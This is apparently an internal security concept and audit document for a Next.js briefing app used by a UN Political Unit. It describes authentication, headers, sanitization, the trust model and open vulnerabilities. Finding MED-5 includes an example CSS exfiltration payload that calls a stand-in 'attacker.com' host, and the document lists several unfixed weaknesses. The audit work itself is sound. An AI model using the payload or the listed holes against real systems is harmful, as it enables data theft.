# Security Concept

Last updated: 2026-04-09

## Overview

The Morning Briefings app is a restricted-access internal tool for the UN Political Unit. Security is layered across infrastructure (Vercel edge), framework (Next.js / NextAuth), and application code.

**Threat model assumption:** All whitelisted users (`@un.org` emails explicitly added to the whitelist) are currently treated as trusted. The application does not enforce role-based access control or ownership checks. See "Trust Boundary: Authenticated Users" below for the implications and open questions.

## Authentication

### NextAuth.js (Credentials Provider, JWT Strategy)

- **Domain restriction**: Only `@un.org` email addresses are accepted at login and registration.
- **Whitelist gating**: Every email must be present in the `user_whitelist` table before login or registration succeeds. An admin adds emails via the whitelist management UI.
- **Email verification**: Accounts require email verification before login is permitted. A cryptographically random 256-bit token (valid 24h) is sent to the user's email.
- **Password hashing**: bcrypt with 12 rounds for all password storage.
- **Live whitelist re-check**: On every JWT token refresh, the `jwt` callback re-queries the whitelist. If a user is removed, `token.whitelisted` is set to `false` and the proxy middleware blocks further access.
- **24-hour sessions**: JWT `maxAge` is 24 hours (reduced from the NextAuth default of 30 days).
- **Uniform error responses**: All login failures (wrong password, non-whitelisted domain, unverified email) return the same generic `CredentialsSignin` error to prevent user/domain enumeration.

### Cookie Security

| Property | Value (production) |
|---|---|
| Name prefix | `__Secure-` |
| `httpOnly` | `true` |
| `secure` | `true` |
| `sameSite` | `lax` |

The `__Secure-` prefix enforces that the browser will only accept the cookie over HTTPS. `httpOnly` prevents JavaScript access. `sameSite: lax` provides CSRF protection for cross-origin POST requests.

### Password Reset

- Reset tokens are 256-bit cryptographically random values.
- Tokens are **bcrypt-hashed before storage** in the database (the plaintext token only exists in memory and in the email).
- Tokens expire after 30 minutes.
- Issuing a new token invalidates all previous unused tokens for that user.
- The endpoint always returns a generic success response regardless of whether the email exists, preventing email enumeration.
- Email links use the `NEXTAUTH_URL` environment variable (not request headers) to prevent host header injection.

## Route Protection

### Proxy Middleware (`proxy.ts`)

Next.js 16 proxy middleware protects all page routes. It runs at the edge before the page is rendered:

- Redirects unauthenticated users to `/login`.
- Checks `token.whitelisted !== false`, enforcing live whitelist revocation.
- Excluded paths: `/login`, `/reset-password`, `/verify-email`, `/api/*`, static assets.

### API Route Guards

All API routes call `checkAuth()` from `src/lib/auth-helper.ts`, which verifies the session via `getServerSession()`. Unauthenticated requests receive HTTP 401.

## Rate Limiting (Vercel WAF)

Rate limiting is enforced at the Vercel edge via WAF custom rules, before serverless functions are invoked. This is stateful at the edge (not in-memory) and consistent across all instances.

| Endpoint | Limit | Window | Action |
|---|---|---|---|
| `POST /api/auth/callback/credentials` (login) | 5 requests/IP | 60s | 429 + 15min block |
| `POST /api/auth/register` | 5 requests/IP | 15min | 429 + 15min block |
| `POST /api/auth/forgot-password` | 3 requests/IP | 15min | 429 + 15min block |

Blocked requests do not consume serverless function invocations.

## Security Headers

Configured in `next.config.ts`, applied to all routes:

| Header | Value |
|---|---|
| `Content-Security-Policy` | `default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob: https://*.blob.core.windows.net; font-src 'self'; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'` |
| `X-Content-Type-Options` | `nosniff` |
| `X-Frame-Options` | `DENY` |
| `X-XSS-Protection` | `1; mode=block` |
| `Referrer-Policy` | `strict-origin-when-cross-origin` |
| `Permissions-Policy` | `camera=(), microphone=(), geolocation=()` |

Additionally: `poweredByHeader: false` removes the `X-Powered-By` header. HSTS is handled by Vercel at the edge (`max-age=63072000`).

### CSP Notes

`'unsafe-inline'` and `'unsafe-eval'` are required by Next.js for inline scripts and Tiptap's editor runtime. This weakens XSS protection from CSP, but React's built-in output escaping and server-side DOMPurify sanitization provide the primary XSS defense. `frame-ancestors 'none'` prevents clickjacking (belt-and-suspenders with `X-Frame-Options: DENY`).

## Input Sanitization

- **HTML content**: `src/lib/sanitize.ts` uses `isomorphic-dompurify` with an explicit allowlist of tags and attributes. No `<script>`, `<iframe>`, `<form>`, or `<object>` tags are permitted. `ALLOW_DATA_ATTR: false`. Sanitization is applied **server-side before every database write** (POST, PUT, import) on both `entry` and `puNote` fields, as well as client-side before rendering via `dangerouslySetInnerHTML`.
- **URL validation**: `sanitizeUrl()` in `src/lib/entry-queries.ts` strips any `sourceUrl` that doesn't start with `http://` or `https://`, preventing `javascript:` XSS via stored links.
- **SQL**: All database queries use parameterized placeholders (`$1`, `$2`, ...) via the `pg` library. No string interpolation of user input into SQL.
- **File uploads**: Image uploads are restricted to `image/jpeg`, `image/png`, `image/gif`, `image/webp` with a 10MB size limit. Filenames are sanitized to alphanumeric characters only.

## Database Security

- **Connection**: SSL with `rejectUnauthorized: true` in production.
- **Schema isolation**: All tables are in the `pu_morning_briefings` schema; the `search_path` is set per query.
- **Connection pooling**: Max 20 connections, 30s idle timeout, pool reuse across hot reloads in development.
- **Credentials**: Connection string from `DATABASE_URL` environment variable, never hardcoded.

## Image & File Storage Security

- **Azure Blob Storage**: Private container (no public access). Accessed via `StorageSharedKeyCredential`.
- **Local fallback**: Path traversal prevention via `path.resolve()` + `startsWith(resolvedBase)` check before serving or deleting files. Applied in both `blob-storage.ts` and `/api/uploads/[filename]`.
- **Serving**: Images are served through authenticated API routes (`/api/images/[id]`), not directly from storage.

## Infrastructure (Vercel)

- **TLS**: TLSv1.3 only, Let's Encrypt certificate.
- **HSTS**: `max-age=63072000` (2 years) applied at the edge.
- **DDoS protection**: Vercel's built-in DDoS mitigation.
- **WAF**: Custom rate limiting rules (see above). Managed rulesets available for additional protection.
- **No source maps in production**.
- **Minimal server disclosure**: `Server: Vercel` only, no version info.

---

## Trust Boundary: Authenticated Users

The application currently treats all authenticated users as equally trusted. This is a deliberate choice based on the small, known user base (UN Political Unit staff), but it has security implications that should be periodically reassessed.

### What this means

- **No role-based access control**: `checkAuth()` verifies a session exists but never inspects `session.user.role`. The `role` field is stored in the JWT but unused. Any authenticated user can manage the whitelist, change email recipients, delete others' entries, and send briefings.
- **No ownership checks on entries**: Any user can edit, delete, or change the status of any other user's entries via `PUT/DELETE /api/entries/[id]`, `PATCH /api/entries`, or `PUT /api/entries/comment`.
- **Import trusts client-supplied data**: `POST /api/entries/import` accepts `entry.id` (UUID) and `entry.authorEmail` from the request body, allowing entries to be attributed to other users.

### When to reconsider

This trust model should be revisited if any of the following change:

- The user base grows beyond a small, known team
- Users outside the core Political Unit are given access
- The application handles more sensitive data or decisions
- An incident occurs involving unauthorized modification of entries

### If hardening is needed

1. Add a `requireRole('admin')` helper and restrict whitelist management, email settings, and briefing sends to admins.
2. Add ownership checks: compare `entry.author_id` against `session.user.id` before UPDATE/DELETE (with admin override).
3. In the import endpoint, ignore `entry.authorEmail` (always use session user) and generate fresh UUIDs server-side.

---

## Open Vulnerabilities

### Medium

#### MED-2: No Payload Size Limits on AI Endpoints

`/api/summarize` and `/api/reformulate` accept arbitrarily large `content` payloads with no size check, enabling excessive Azure OpenAI token consumption.

**Fix:** Add `content.length > MAX_SIZE` guard at the route level.

#### MED-3: SQL Wildcard Injection in Analytics

`src/app/api/analytics/route.ts` — The `countries` parameter is used in a `LIKE` clause. User-supplied `%` or `_` characters cause over-broad matches.

**Fix:** Escape `%` and `_` in user input before wrapping in LIKE wildcards.

#### MED-4: No Max-Length Validation on Text Fields

`headline`, `puNote`, `sourceUrl`, `sourceName`, `thematic` are stored without length limits. Multi-megabyte strings could bloat the database.

**Fix:** Enforce maximum lengths at the API route level.

#### MED-5: `style` Attribute Allowed in DOMPurify Config

`src/lib/sanitize.ts` allows the `style` attribute, enabling CSS-based data exfiltration (e.g., `background:url(https://attacker.com/?data=...)`).

**Fix:** Remove `style` from `ALLOWED_ATTR` or use DOMPurify's `FORBID_ATTR: ['style']`.

#### MED-6: Unsanitized Filename in `Content-Disposition` Header

`src/app/api/images/[id]/route.ts` — `image.filename` from the DB is placed directly in the `Content-Disposition` header without escaping `"` or control characters.

**Fix:** Strip `"` and control characters, or use RFC 5987 encoding.

#### MED-7: `fileName` from Client Body Used Unsanitized in Email Attachment

`src/app/api/send-briefing/route.ts` — `fileName` from the request body is passed directly as the email attachment filename.

**Fix:** Sanitize `fileName` to alphanumeric + `.docx` only.

### Low

- **SMTP STARTTLS not enforced**: Port 587 connections don't set `requireTLS: true`, allowing potential plaintext downgrade.
- **Email verification tokens stored as plaintext**: Unlike reset tokens (bcrypt-hashed). Low risk due to 24h expiry and one-time use.
- **CSP `unsafe-inline`/`unsafe-eval`**: Required by Next.js and Tiptap, weakening CSP's XSS protection.
- **Reset token in URL query parameter**: Appears in server logs, referrer headers, browser history. 30-minute expiry limits the window.
- **`/api/user/delete` returns 405 without calling `checkAuth()`**: Safe as-is but fragile if logic is added later.
- **`/api/test-session` exposes full session object in development**: Intentional but should be documented.

## Remediation Priority

| Priority | Issue | Effort |
|----------|-------|--------|
| P2 | Sanitize email attachment filename (MED-7) | Low |
| P2 | Add payload size limits to AI endpoints (MED-2) | Low |
| P2 | Escape SQL wildcards in analytics (MED-3) | Low |
| P2 | Sanitize `Content-Disposition` filename (MED-6) | Low |
| P3 | Remove `style` from DOMPurify allowlist (MED-5) | Low |
| P3 | Add max-length validation on text fields (MED-4) | Low |

---

## Changes Log

### 2026-04-09 — Code Audit Fixes

5. **Server-side HTML sanitization**: `sanitizeHtml()` (DOMPurify) now called before every INSERT/UPDATE of `entry` and `puNote` HTML in `POST /api/entries`, `PUT /api/entries/[id]`, and `POST /api/entries/import`. Also covers AI-generated HTML from `/api/auto-fill`.
6. **`sourceUrl` protocol validation**: New `sanitizeUrl()` helper in `src/lib/entry-queries.ts` strips URLs not starting with `http://` or `https://`. Applied at storage time in all entry write paths.
7. **Host header injection fixed**: `resolveBaseUrl()` in `src/lib/email-service.ts` now uses `NEXTAUTH_URL` env var instead of request headers for constructing email links.
8. **Path traversal guard on uploads**: `/api/uploads/[filename]` now uses `path.resolve()` + `startsWith(resolvedBase)` check, matching the pattern already used in `blob-storage.ts`.

### 2026-04-09 — External Penetration Test Fixes

1. **User enumeration eliminated**: Login no longer returns different error codes for whitelisted vs. non-whitelisted domains. All failures return a generic `CredentialsSignin` error.
2. **Rate limiting added**: Vercel WAF rules for login, registration, and forgot-password endpoints.
3. **CSP header added**: `Content-Security-Policy` with restrictive defaults, allowing only required sources.
4. **Google Analytics placeholder removed**: The `<GoogleAnalytics gaId="G-XYZ" />` component was loading unnecessary JavaScript with a non-functional tracking ID.
